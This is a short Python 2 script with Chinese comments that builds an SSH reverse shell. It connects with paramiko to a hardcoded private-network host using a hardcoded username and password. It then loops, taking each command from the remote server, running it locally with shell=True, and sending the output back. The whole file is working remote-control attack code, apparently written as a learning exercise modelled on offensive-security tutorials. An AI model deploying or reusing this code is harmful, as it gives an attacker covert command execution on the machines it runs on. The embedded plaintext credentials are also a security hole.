# -*- coding:utf-8 -*-

# 此文件建立一个反向连接的客户端
import threading
import paramiko
import subprocess


def ssh_command(ip, user, passwd, command):
    # 1.首先创建一个SSH客户端
    client = paramiko.SSHClient()
    # 用于公钥登录时从本地主机载入远程主机的公钥
    # client.load_host_keys('/home/justin/.ssh/know_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # 2.连接远程主机
    client.connect(ip, username=user, password=passwd)
    # 3.得到远程主机返回的session用于维持会话
    ssh_session = client.get_transport().open_session()
    # 4.发送和接受命令
    if ssh_session.active:
        ssh_session.send(command) # 此时发送的是ClientConnected命令
        print ssh_session.recv(1024)  # read banner
        while True:
            # get the command from the SSH server
            # -----------此时的命令是从远程主机得到的，也就是说这时候开始了反向的连接控制---------------
            command = ssh_session.recv(1024) 
            try:
                # 本地执行远程命令
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)  # 把结果发送给Server
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
        return
ssh_command('192.168.2.128', 'lenhoon', 'zlhzlh910413', 'ClientConnected')
